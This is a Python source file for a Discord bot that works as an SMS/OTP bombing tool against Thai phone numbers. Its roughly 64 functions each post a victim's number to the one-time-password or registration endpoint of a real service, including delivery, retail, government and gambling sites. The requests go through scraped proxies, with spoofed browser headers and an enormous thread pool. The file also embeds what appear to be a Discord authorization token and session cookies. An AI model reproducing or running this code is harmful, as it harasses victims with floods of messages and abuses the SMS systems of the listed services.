#!/usr/bin/env python
import requests, discord, threading, os, random, time
from requests import Session, delete, get, post
from json import load
from re import search
from time import sleep
from random import choice
from string import ascii_uppercase, digits
from concurrent.futures import ThreadPoolExecutor
from discord.ext import commands

with open('cfg.json') as setting:
    config = load(setting)

Token = config.get('token')
Prefix = config.get('prefix')
Limit = config.get('limit')
bot_room = config.get('bot_room')


bot = commands.Bot(command_prefix=Prefix)
bot.remove_command("help")

def getproxy():
    q = requests.get('https://www.proxy-list.download/api/v1/get?type=http')
    f = open('proxy.txt','wb')
    f.write(q.content)
    f.close()
    ##print(f"     Load proxy : {str(len(proxy))} proxy")

#########proxy = open("proxy.txt", "r").read().splitlines()

def randomString(N):
    return ''.join(choice(ascii_uppercase + digits) for _ in range(N))

session = requests.Session()

threading = ThreadPoolExecutor(max_workers=100000000)
useragent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Edg/95.0.1020.40"

def ASCII1(phone):
    post("https://api.myfave.com/api/fave/v3/auth", proxies ={"http" : "http://" + random.choice(proxy)}, headers={"client_id": "dd7a668f74f1479aad9a653412248b62", "User-Agent": useragent},json={"phone": f"66{phone}"})

def ASCII2(phone):
    post("https://u.icq.net/api/v65/rapi/auth/sendCode", proxies ={"http" : "http://" + random.choice(proxy)}, headers={"User-Agent": useragent}, json={"reqId":"39816-1633012470","params":{"phone": f"+66{phone[1:]}","language":"en-US","route":"sms","devId":"ic1rtwz1s1Hj1O0r","application":"icq"}})

def ASCII3(phone):
    post("https://api2.1112.com/api/v1/otp/create", proxies ={"http" : "http://" + random.choice(proxy)}, headers={"User-Agent": useragent}, data={'phonenumber': phone,'language': "th"})

def ASCII4(phone):
    post("https://ecomapi.eveandboy.com/v10/user/signup/phone", proxies ={"http" : "http://" + random.choice(proxy)}, headers={"User-Agent": useragent}, data={"phone": phone,"password":"123456789Az"})

def ASCII5(phone):
    post("https://api.1112delivery.com/api/v1/otp/create", proxies ={"http" : "http://" + random.choice(proxy)}, headers={"User-Agent": useragent}, data={'phonenumber': phone,'language': "th"})

def ASCII6(phone):
    post("https://gccircularlivingshop.com/sms/sendOtp", proxies ={"http" : "http://" + random.choice(proxy)}, headers={"User-Agent": useragent}, json={"grant_type":"otp","username": f"+66{phone[1:]}","password":"","client":"ecommerce"})

def ASCII7(phone):
    post("https://shop.foodland.co.th/login/generation", proxies ={"http" : "http://" + random.choice(proxy)}, headers={"User-Agent": useragent}, data={"phone": phone})

def ASCII8(phone):
    post("https://api-shop.diorbeauty.hk/api/th/ecrm/sms_generate_code", proxies ={"http" : "http://" + random.choice(proxy)}, headers={"User-Agent": useragent}, data={"number": f"+66{phone[1:]}"})

def ASCII9(phone):
    post("https://api.sacasino9x.com/api/RegisterService/RequestOTP", proxies ={"http" : "http://" + random.choice(proxy)}, headers={"User-Agent": useragent}, json={"Phone": phone})

def ASCII10(phone):
    post("https://shoponline.ondemand.in.th/OtpVerification/VerifyOTP/SendOtp", proxies ={"http" : "http://" + random.choice(proxy)}, headers={"User-Agent": useragent}, data={"phone": phone})

def ASCII11(phone):
    post("https://www.konvy.com/ajax/system.php?type=reg&action=get_phone_code", proxies ={"http" : "http://" + random.choice(proxy)}, headers={"User-Agent": useragent}, data={"phone": phone})

def ASCII12(phone):
    post("https://partner-api.grab.com/grabid/v1/oauth2/otp", proxies ={"http" : "http://" + random.choice(proxy)}, headers={"User-Agent": useragent}, json={"client_id":"4ddf78ade8324462988fec5bfc5874c2","transaction_ctx":"null","country_code":"TH","method":"SMS","num_digits":"6","scope":"openid profile.read foodweb.order foodweb.rewards foodweb.get_enterprise_profile","phone_number": f"66{phone[1:]}"})

def ASCII13(phone):
    post("https://api.scg-id.com/api/otp/send_otp", proxies ={"http" : "http://" + random.choice(proxy)}, headers={"User-Agent": useragent, "Content-Type": "application/json;charset=UTF-8"},json={"phone_no": phone})

def ASCII14(phone):
    session = Session()
    searchItem = session.get("https://www.shopat24.com/register/").text
    ReqTOKEN = search("""<input type="hidden" name="_csrf" value="(.*)" />""", searchItem).group(1)
    session.post("https://www.shopat24.com/register/ajax/requestotp/", proxies ={"http" : "http://" + random.choice(proxy)}, headers={"User-Agent": useragent, "content-type": "application/x-www-form-urlencoded; charset=UTF-8","X-CSRF-TOKEN": ReqTOKEN}, data={"phoneNumber": phone})

def ASCII15(phone):
    post("https://prettygaming168-api.auto888.cloud/api/v3/otp/send", proxies ={"http" : "http://" + random.choice(proxy)} ,headers={"User-Agent": useragent}, data={"tel": phone,"otp_type":"register"})

def ASCII16(phone):
    post("https://the1web-api.the1.co.th/api/t1p/regis/requestOTP", proxies ={"http" : "http://" + random.choice(proxy)} ,headers={"User-Agent": useragent}, json={"on":{"value": phone,"country":"66"},"type":"mobile"})

def ASCII17(phone):
    post(f"https://th.kerryexpress.com/website-api/api/OTP/v1/RequestOTP/{phone}", proxies ={"http" : "http://" + random.choice(proxy)},headers={"User-Agent": useragent})

def ASCII18(phone):
    post("https://graph.firster.com/graphql", proxies ={"http" : "http://" + random.choice(proxy)}, headers={"User-Agent": useragent, "organizationcode": "lifestyle","content-type": "application/json"}, json={"operationName":"sendOtp","variables":{"input":{"mobileNumber": phone[1:],"phoneCode":"THA-66"}},"query":"mutation sendOtp($input: SendOTPInput!) {\n  sendOTPRegister(input: $input) {\n    token\n    otpReference\n    expirationOn\n    __typename\n  }\n}\n"})

def ASCII19(phone):
    post("https://nocnoc.com/authentication-service/user/OTP?b-uid=1.0.661", proxies ={"http" : "http://" + random.choice(proxy)},headers={"User-Agent": useragent}, json={"lang":"th","userType":"BUYER","locale":"th","orgIdfier":"scg","phone": f"+66{phone[1:]}","type":"signup","otpTemplate":"buyer_signup_otp_message","userParams":{"buyerName": randomString(10)}})

def ASCII20(phone):
    post("https://store.boots.co.th/api/v1/guest/register/otp", proxies ={"http" : "http://" + random.choice(proxy)},headers={"User-Agent": useragent}, json={"phone_number":f"+66{phone[1:]}"})

def ASCII21(phone):
    post("https://m.lucabet168.com/api/register-otp", proxies ={"http" : "http://" + random.choice(proxy)},headers={"User-Agent": useragent} ,json={"brands_id":"609caede5a67e5001164b89d","agent_register":"60a22f7d233d2900110070d7","tel": phone})

def ASCII22(phone):
    session = Session()
    ReqTOKEN = session.get("https://srfng.ais.co.th/Lt6YyRR2Vvz%2B%2F6MNG9xQvVTU0rmMQ5snCwKRaK6rpTruhM%2BDAzuhRQ%3D%3D?redirect_uri=https%3A%2F%2Faisplay.ais.co.th%2Fportal%2Fcallback%2Ffungus%2Fany&httpGenerate=generated", proxies ={"http" : "http://" + random.choice(proxy)},headers={"User-Agent": useragent}).text
    session.post("https://srfng.ais.co.th/login/sendOneTimePW", proxies ={"http" : "http://" + random.choice(proxy)}, data=f"msisdn=66{phone[1:]}&serviceId=AISPlay&accountType=all&otpChannel=sms",headers={"User-Agent": useragent,"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "authorization": f'''Bearer {search("""<input type="hidden" id='token' value="(.*)">""", ReqTOKEN).group(1)}'''})

def ASCII23(phone):
    post(url="https://www.cpffeedonline.com/Customer/RegisterRequestOTP", proxies ={"http" : "http://" + random.choice(proxy)},data={"mobileNumber":f"0{phone}"})

def ASCII24(phone):
    post(url="https://www.tgfone.com/index.php/signin/otp_chk", proxies ={"http" : "http://" + random.choice(proxy)},data={"mobile":f"0{phone}"})

def ASCII25(phone):
    post("https://api2.1112.com/api/v1/otp/create", proxies ={"http" : "http://" + random.choice(proxy)},json={"phonenumber":f"0{phone}","language":"th"}, headers={"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Edg/95.0.1020.38"})

def ASCII26(phone):
    post("https://unacademy.com/api/v3/user/user_check/", proxies ={"http" : "http://" + random.choice(proxy)},json={"phone":f"0{phone}","country_code":"TH"}, headers={"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Edg/95.0.1020.38"})

def ASCII27(phone):
    post(f"http://m.vcanbuy.com/gateway/msg/send_regist_sms_captcha?mobile=66-0{phone}", proxies ={"http" : "http://" + random.choice(proxy)})

def ASCII28(phone):
    post("https://ocs-prod-api.makroclick.com/next-ocs-member/user/register", proxies ={"http" : "http://" + random.choice(proxy)},json={"username": f"0{phone}","password":"6302814184624az","name":"0903281894","provinceCode":"28","districtCode":"393","subdistrictCode":"3494","zipcode":"40260","siebelCustomerTypeId":"710","acceptTermAndCondition":"true","hasSeenConsent":"false","locale":"th_TH"}, headers={"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Edg/95.0.1020.38"})

def ASCII29(phone):
    post("https://shoponline.ondemand.in.th/OtpVerification/VerifyOTP/SendOtp", proxies ={"http" : "http://" + random.choice(proxy)},data={"phone": f"0{phone}"}, headers={"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Edg/95.0.1020.38"})

def ASCII30(phone):
    post("https://www.berlnw.com/reservelogin", data={"p_myreserve": f"0{phone}"}, proxies ={"http" : "http://" + random.choice(proxy)},headers={"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Edg/95.0.1020.38"})

def ASCII31(phone):
    post("https://www.kickoff28.com/action.php?mode=PreRegister", data={"tel": f"0{phone}"}, proxies ={"http" : "http://" + random.choice(proxy)},headers={"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Edg/95.0.1020.38"})

def ASCII32(phone):
    post("https://1ufabet.com/_ajax_/request-otp", proxies ={"http" : "http://" + random.choice(proxy)},data={"request_otp[phoneNumber]": f"0{phone}", "request_otp[termAndCondition]": "1", "request_otp[_token]": "XBNcvQIzJK1pjh_2T0BBzLiDa6vSivktDN317mbw3ws"}, headers={"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Edg/95.0.1020.38"})

def ASCII33(phone):
    post("https://findclone.ru/register?phone=+66{phone[1:]}",proxies ={"http" : "http://" + random.choice(proxy)},headers={"X-Requested-With" : "XMLHttpRequest","User-Agent" : "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.116 Safari/537.36"})

def ASCII34(phone):
    post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",proxies ={"http" : "http://" + random.choice(proxy)},data=f"st.r.phone=+66{phone[1:]}")
    post("https://ok.ru/dk?cmd=AnonymRegistrationAcceptCallUI&st.cmd=anonymRegistrationAcceptCallUI",proxies ={"http" : "http://" + random.choice(proxy)},data="st.r.fieldAcceptCallUIButton=Call")

def ASCII35(phone):
    post("https://partner-api.grab.com/grabid/v1/oauth2/otp", proxies ={"http" : "http://" + random.choice(proxy)},headers={"User-Agent": useragent}, json={"client_id":"4ddf78ade8324462988fec5bfc5874c2","transaction_ctx":"null","country_code":"TH","method":"SMS","num_digits":"6","scope":"openid profile.read foodweb.order foodweb.rewards foodweb.get_enterprise_profile","phone_number": f"66{phone[1:]}"})

def ASCII36(phone):
    post("https://cognito-idp.ap-southeast-1.amazonaws.com/",proxies ={"http" : "http://" + random.choice(proxy)},headers={"cache-control": "max-age=0","user-agent": "Mozilla/5.0 (Linux; Android 10; Redmi 8A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36","content-type": "application/x-amz-json-1.1","x-amz-target": "AWSCognitoIdentityProviderService.ResendConfirmationCode","x-amz-user-agent": "aws-amplify/0.1.x js","referer": "https://www.bugaboo.tv/members/resetpass/phone"},json={"ClientId":"6g47av6ddfcvi06v4l186c16d6","Username":f"+66{phone[1:]}"})

def ASCII37(phone):
    post("https://www.carsome.co.th/website/login/sendSMS",proxies ={"http" : "http://" + random.choice(proxy)},json={"username":phone,"optType":0})

def ASCII38(phone):
    post("https://m.lavagame168.com/api/register-otp",proxies ={"http" : "http://" + random.choice(proxy)},headers={"x-exp-signature": "5ffc0caa4d603200124e4eb1","user-agent": "Mozilla/5.0 (Linux; Android 10; Redmi 8A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36","referer": "https://m.lavagame168.com/dashboard/login"},json={"brands_id":"5ffc0caa4d603200124e4eb1","agent_register":"5ffc0d5cdcd4f30012aec3d9","tel": phone})

def ASCII39(phone):
    post("https://ep789bet.net/auth/send_otp", proxies ={"http" : "http://" + random.choice(proxy)},data={"phone":f"{phone}"})

def ASCII40(phone):
	post("https://discord.com/api/v9/users/@me/phone",proxies ={"http" : "http://" + random.choice(proxy)},json={
  "phone": "+66"+phone,
  "change_phone_reason": "guild_phone_required"
},headers={"authorization":"OTA4MjA2NjE4NjE1OTA2Mzg1.Ycz2Hw.TdQLC2lIwn6UQDl1xBsyJGLnjOw"})

def ASCII41(phone):
	get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register", proxies ={"http" : "http://" + random.choice(proxy)})

def ASCII42(phone):
	post("https://topping.truemoveh.com/api/get_request_otp",proxies ={"http" : "http://" + random.choice(proxy)},data={"mobile_number": phone,
	})

def ASCII43(phone):
	get("https://www.baanandbeyond.com/registration_initiate?on%5Bcountry%5D=66&on%5Bvalue%5D="+phone+"&type=mobile", proxies ={"http" : "http://" + random.choice(proxy)},)

def ASCII44(phone):
	get("https://api.quickcash8.com/v1/login/captcha?timestamp=1636359633&sign=3a11b88fbf58615099d15639e714afcc&token=&version=2.3.2&appsFlyerId=1636346593405-2457389151564256014&platform=android&channel_str=&phone="+phone+"&img_code=", proxies ={"http" : "http://" + random.choice(proxy)},headers = {"Host": "api.quickcash8.com", "Connection": "Keep-Alive", "Accept": "gzip", "User-Agent": "okhttp/3.11.0"})

def ASCII45(phone):
    d=post("https://taxi.yandex.kz/3.0/launch/",json={},proxies ={"http" : "http://" + random.choice(proxy)},headers={"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Edg/95.0.1020.38"}).json()
    d=post("https://taxi.yandex.kz/3.0/auth/",json={"id": d["id"], "phone": f"+66{phone[1:]}"},headers={"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Edg/95.0.1020.38"}).text

def ASCII46(phone): 
    post('https://api.baccaratth.com/api/v1/sendotp', proxies ={"http" : "http://" + random.choice(proxy)},data = {'phone_number': phone})

def ASCII47(phone): 
    get('http://m.thaiuang.com/uc/authcode/sms/get/reg/'+phone , proxies ={"http" : "http://" + random.choice(proxy)})

def ASCII48(phone): 
    print(Session().post("https://us-central1-otp-service-icc.cloudfunctions.net/getotp", proxies ={"http" : "http://" + random.choice(proxy)},headers={ 
        "Content-Type": "application/json"
        }, json={"mobile_phone": phone,"type":"HISHER"}))

def ASCII49(phone):
        requests=Session()
        requests.headers.update({"User-Agent" : "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Edg/95.0.1020.38","Content-Type" : "application/x-www-form-urlencoded","Accept" : "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9"})
        post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",proxies ={"http" : "http://" + random.choice(proxy)},data=f"st.r.phone=+66{phone[1:]}")
        post("https://ok.ru/dk?cmd=AnonymRegistrationAcceptCallUI&st.cmd=anonymRegistrationAcceptCallUI",proxies ={"http" : "http://" + random.choice(proxy)},data="st.r.fieldAcceptCallUIButton=Call")

def ASCII50(phone):
    post("https://unacademy.com/api/v3/user/user_check/",json={"phone":phone,"country_code":"TH"},proxies ={"http" : "http://" + random.choice(proxy)},headers={"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Edg/95.0.1020.38"}).json()

def ASCII52(phone):
    post("https://www.kaitorasap.co.th/api/index.php/send-otp/",proxies ={"http" : "http://" + random.choice(proxy)}, data="phone_number="+phone+"&lag=",headers={"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8","Cookie": "PHPSESSID=f5nrukmps3fa5gk25eh4v0tgg0; _ga=GA1.3.1240095898.1635597163; _gid=GA1.3.747741928.1635597163; _gat_gtag_UA_141105037_1=1"})

def ASCII53(phone):
    post("https://www.fox888.com/api/otp/register",data = "applicant="+phone+"&serviceName=FOX888",headers = {"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36", "content-type": "application/x-www-form-urlencoded; charset=UTF-8", "Accept": "*/*", "X-Requested-With": "XMLHttpRequest"})

def ASCII54(phone):
    post('https://www.wongnai.com/_api/guest.json?_v=6.053&locale=th&_a=phoneLogIn', json={f'phoneno={phone}&retrycount=0'}, proxies ={"http" : "http://" + random.choice(proxy)},headers={'"content-type": "application/x-www-form-urlencoded",'})

def ASCII55(phone):
    post("https://api.true-shopping.com/customer/api/request-activate/mobile_no", proxies ={"http" : "http://" + random.choice(proxy)},data={"username": phone})

def ASCII56(phone):
    post("https://api-customer.lotuss.com/clubcard-bff/v1/customers/otp", proxies ={"http" : "http://" + random.choice(proxy)},data={"mobile_phone_no":phone})

def ASCII57(phone):
    post('https://www.sso.go.th/wpr/MEM/terminal/ajax_send_otp',proxies ={"http" : "http://" + random.choice(proxy)},headers = {"User-Agent": "Mozilla/5.0 (Linux; Android 10; Redmi 8A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36","Content-Type": "application/x-www-form-urlencoded; charset=UTF-8","X-Requested-With": "XMLHttpRequest","Cookie": "sso_local_storeci_sessions=KHj9a18RowgHYWbh71T2%2FDFAcuC2%2FQaJkguD3MQ1eh%2FlwrUXvpAjJgrm6QKAja4oe7rglht%2BzO6oqblJ4EMJF4pqnY%2BGtR%2F0RzIFGN0Suh1DJVRCMPpP8QtZsF5yDyw6ibCMf2HXs95LvAMi7KUkIeaWkSahmh5f%2F3%2FqcOQ2OW5yakrMGA1mJ5upBZiUdEYNmxUAljcqrg7P3L%2BGAXxxC2u1bO09Oz4qf4ZV9ShO0gz5p5CbkE7VxIq1KUrEavn9Y%2BarQmsh1qIIc51uvCev1U1uyXfC%2F9U7uRl7x%2FVYZYT2pkLd3Q7qnZoSNBL8y9wge8Lt7grySdVLFhw9HB68dTSiOm1K04QhdrprI7EsTLWDHTgYmgyTQDuz63YjHsH5MUVanlfBISU1WXmRTXMKbUjlcl0LPPYUR9KWzrVL7sXcrCX%2FfUwLJIU%2F7MTtDYUx39y1CAREM%2F8dw7AEjcJAOA%3D%3D684b65b9b9dc33a3380c5b121b6c2b3ecb6f1bec; PHPSESSID=1s2rdo0664qpg4oteil3hhn3v2; TS01ac2b25=01584aa399fbfcc6474d383fdc1405e05eaa529fa33e596e5189664eb7dfefe57b927d8801ad40fba49f0adec4ce717dd5eabf08d7080e2b85f34368a92a47e71ef07861a287c40da15c0688649509d7f97eb2c293; _ga=GA1.3.1824294570.1636876684; _gid=GA1.3.1832635291.1636876684"},data=f"dCard=1358231116147&Mobile={phone}&password=098098Az&repassword=098098Az&perPrefix=Mr.&cn=Dhdhhs&sn=Vssbsh&perBirthday=5&perBirthmonth=5&perBirthyear=2545&Email=nickytom5879%40gmail.com&otp_type=OTP&otpvalue=&messageId=REGISTER")

def ASCII58(phone):
    post("https://tamjaibet.com/api/request/otp", proxies ={"http" : "http://" + random.choice(proxy)},data={"phoneNumber": "0"+phone,"token":"HFdjc3ZU4WAnxLQQcCWB0TWV9zPCdpWmFpCUApNUtwAENbCGJkEAR9ckcdc20XMFR8HVQhEkREXwIOcDwnKRl1LDpXaQMJYB8ZSBQzZRdpem4YF3VHST0BYVQTU1NEcQATSSgpOnY3ZS9ZAFw3WSZXASwecS4LZD5wWhRicklxFQ1cFVAiczQOYxYSfUkaTD1sSSFTZU0mRDoZciRkEHV9dTE"})

def ASCII59(phone):
    get("https://m.redbus.id/api/getOtp?number="+phone[1:]+"&cc=66&whatsAppOpted=true",proxies ={"http" : "http://" + random.choice(proxy)},headers={"traceparent": "00-7d1f9d70ec75d3fb488d8eb2168f2731-6b243a298da767e5-01","user-agent": "Mozilla/5.0 (Linux; Android 10; Redmi 8A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36"}).text

def ASCII60(phone):
	post("https://jdbaa.com/api/otp-not-captcha", proxies ={"http" : "http://" + random.choice(proxy)},data={"phone_number":phone})

def ASCII61(phone):
	head = {
	    "user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36",
	    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
	    "referer": "https://laopun.com/register",
	    "cookie": "PHPSESSID=q32n008kgetm0tilch7f5qv2qp;_ga=GA1.1.677079826.1639848607;_ga_70EKP2Z28V=GS1.1.1639848607.1.1.1639848745.0"
	    }
	post(f"https://laopun.com/send-sms?id={phone}&otp=5153",proxies ={"http" : "http://" + random.choice(proxy)},headers=head) 

def ASCII62(phone):
	head = {
	    "content-type": "application/json;charset=UTF-8",
	    "user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36",
	    "accept": "application/json, text/plain, */*",
	    "referer": "https://www.carsome.co.th/sell-car?gclsrc=aw.ds&&&utm_source=Google&utm_medium=Search&utm_campaign=TH_C2B_Valuation_SmartPhrase_Core_&utm_term=Search_Core_C2B_TH_Perf_Conv_&utm_content=%E0%B8%A3%E0%B8%96%E0%B8%A1%E0%B8%B7%E0%B8%AD%E0%B8%AA%E0%B8%AD%E0%B8%87%E0%B8%A3%E0%B8%B2%E0%B8%84%E0%B8%B2%E0%B8%96%E0%B8%B9%E0%B8%81&gclid=Cj0KCQiAqvaNBhDLARIsAH1Pq53bS1JUOrg_c7AM2rjbL8ROKwGaHxVkCyIhqOPhU5bzui7v2wek3bEaAuooEALw_wcB",
	    "cookie": "_gcl_au=1.1.1272461332.1638187764;G_ENABLED_IDPS=google;_ga=GA1.3.808434087.1638187769;__lt__cid=10b9db7a-fed7-4a04-99d2-cdf99ccd76b8;_gid=GA1.3.1113186157.1639742520;_fbp=fb.2.1639742521800.1608632439;ajs_anonymous_id=fc77ca54-b140-4d14-a811-9be694d4dcfa;_hjSessionUser_1895262=eyJpZCI6IjJmYTg1NjkzLTIwYWUtNTQ3ZC1iYTgyLTZjMTZhNDE4N2VjOSIsImNyZWF0ZWQiOjE2Mzk3NDI1MjIzMDAsImV4aXN0aW5nIjp0cnVlfQ==;_cc_id=c18b09fbdfdf3183761afb6f7799f21d;panoramaId_expiry=1640349594875;panoramaId=052fccf0cccc27f1f255389082ee16d53938c5a780adb183ac3642512b6c17dc;_clck=18ofz7k|1|exd|0;skylab_deviceId=IuD7oBeC61H6n41Z1FH3ek;_gcl_aw=GCL.1639853869.Cj0KCQiAqvaNBhDLARIsAH1Pq53bS1JUOrg_c7AM2rjbL8ROKwGaHxVkCyIhqOPhU5bzui7v2wek3bEaAuooEALw_wcB;_gcl_dc=GCL.1639853869.Cj0KCQiAqvaNBhDLARIsAH1Pq53bS1JUOrg_c7AM2rjbL8ROKwGaHxVkCyIhqOPhU5bzui7v2wek3bEaAuooEALw_wcB;amp_893e6b=IuD7oBeC61H6n41Z1FH3ek...1fn7egd40.1fn7egjki.1.3.4;__lt__sid=f6ad8bda-06d0796d;_gac_UA-70043720-5=1.1639853872.Cj0KCQiAqvaNBhDLARIsAH1Pq53bS1JUOrg_c7AM2rjbL8ROKwGaHxVkCyIhqOPhU5bzui7v2wek3bEaAuooEALw_wcB;_gat_UA-70043720-5=1;_uetsid=23e4ae005f3111ec8d8c79ffb5e7c09b;_uetvid=33f5ca20510d11ec8e1175a84efe64f8;_hjSession_1895262=eyJpZCI6IjY2YWZlZmI0LWMwMDYtNGFkMS1hMWE3LTQ3NDllYmQ2MDNjYSIsImNyZWF0ZWQiOjE2Mzk4NTM4NzU4MDd9;_hjIncludedInPageviewSample=1;_hjAbsoluteSessionInProgress=0;_hjIncludedInSessionSample=0;_clsk=15fms60|1639853877001|1|1|e.clarity.ms/collect"
	    }
	post("https://www.carsome.co.th/website/login/sendSMS", proxies ={"http" : "http://" + random.choice(proxy)},headers=head, json={"username":phone,"optType":0}).json()

def ASCII63(phone):
	post("https://m.riches666.com/api/register-otp", proxies ={"http" : "http://" + random.choice(proxy)},data={"brands_id":"60a6563a232a600012521982","agent_register":"60a76a7f233d2900110070e0","tel":phone})

def ASCII64(phone):
	head = {
	    "x-requested-with": "XMLHttpRequest",
	    "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
	    "user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36",
	    "accept": "*/*",
	    "referer": "https://www.pruksa.com/member/register/otp_code",
	    "cookie": "verify=test;_gcl_au=1.1.1068520588.1638975731;_fbp=fb.1.1638975732655.1853691445;_accept_privacy=1;_gid=GA1.2.1560033587.1639887354;PHPSESSID=p8hr5emvd96q6lu10dm6tmfgt7;exp_last_visit=1639452885;exp_csrf_token=3e1cdd2103438cac128d4e8e653ef743f8311dae;_cbclose=1;_cbclose41932=1;_uid41932=2F6F4EEE.5;_ctout41932=1;exp_last_activity=1639887731;exp_tracker=a%3A3%3A%7Bi%3A0%3Bs%3A24%3A%22member%2Fregister%2Fotp_code%22%3Bi%3A1%3Bs%3A15%3A%22member%2Fregister%22%3Bi%3A2%3Bs%3A19%3A%22member%2Flogin%2Fdialog%22%3B%7D;AWSALB=1Evv6AvajZc8F/H8z876YldEIQEiiMHM+U533XqPouYiJbzSjpgYGJ/8oleAYB8GhBiN5a2/t5RrOgv9hXaVn0r3L0FYGUWyhj8amyU1GgObUn/WRjtvbXGGFanS;AWSALBCORS=1Evv6AvajZc8F/H8z876YldEIQEiiMHM+U533XqPouYiJbzSjpgYGJ/8oleAYB8GhBiN5a2/t5RrOgv9hXaVn0r3L0FYGUWyhj8amyU1GgObUn/WRjtvbXGGFanS;_ga_1S3Q68V0J2=GS1.1.1639887351.6.1.1639887736.0;_ga=GA1.2.1203242697.1638975732;_gat_UA-12021683-1=1;exp_current_url=https%3A%2F%2Fwww.pruksa.com%2Fmember%2Fregister%2Fotp_code"
	    }
	post("https://www.pruksa.com/member/member_otp/re_create",proxies ={"http" : "http://" + random.choice(proxy)},headers=head,data=f"required=otp&mobile={phone}")

def ASCII65(phone):
	head = {
	    "content-type": "application/json;charset=UTF-8",
	    "user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36",
	    "accept": "application/json, text/plain, */*",
	    "referer": "https://vaccine.trueid.net/",
	    "cookie": "tids=cj6rr5kfn7n5eq48kjvtjshbmm6fl822;visid_incap_2104120=tLQf04X9QQOCL3N5NvNoVFt6lGEAAAAAQUIPAAAAAACBOqMUEW78XaYnxR7kJ7pF;_ga_id=908257605.1637120616;_gcl_au=1.1.781159093.1639210714;_fbp=fb.1.1639210716826.1287073338;visid_incap_2608850=sCqytT60R3yHmHPZaoQgs9WLuGEAAAAAQUIPAAAAAADemRF44I7x0AvVgLWDt3rL;pbjs-pubCommonId=4764c6cc-f296-45a4-873a-5cd0bd43510e;_cc_id=c18b09fbdfdf3183761afb6f7799f21d;unique_user_id=332651712.1639210715;__gads=ID=abe63e684890d998:T=1639484401:S=ALNI_MbXUWyQkNhtJ2m57vxHz6ORO4bxRg;_ga=GA1.2.332651712.1639210715;_gid=GA1.2.465629380.1639888137;_gat_UA-86733131-1=1;_cbclose=1;_cbclose26068=1;_uid26068=B513FC64.8;_ctout26068=1;verify=test;OptanonConsent=isIABGlobal=false&datestamp=Sun+Dec+19+2021+11%3A29%3A09+GMT%2B0700+(%E0%B9%80%E0%B8%A7%E0%B8%A5%E0%B8%B2%E0%B8%AD%E0%B8%B4%E0%B8%99%E0%B9%82%E0%B8%94%E0%B8%88%E0%B8%B5%E0%B8%99)&version=6.13.0&hosts=&landingPath=NotLandingPage&groups=C0001%3A1%2CC0002%3A1%2CC0003%3A1%2CC0004%3A1%2CC0005%3A1&geolocation=%3B&AwaitingReconsent=false;OptanonAlertBoxClosed=2021-12-19T04:29:09.733Z;_ga_R05PJC3ZG8=GS1.1.1639888134.6.1.1639888160.34"
	    }
	post("https://vaccine.trueid.net/vacc-verify/api/getotp",proxies ={"http" : "http://" + random.choice(proxy)},headers=head,json={"msisdn":phone,"function":"enroll"})

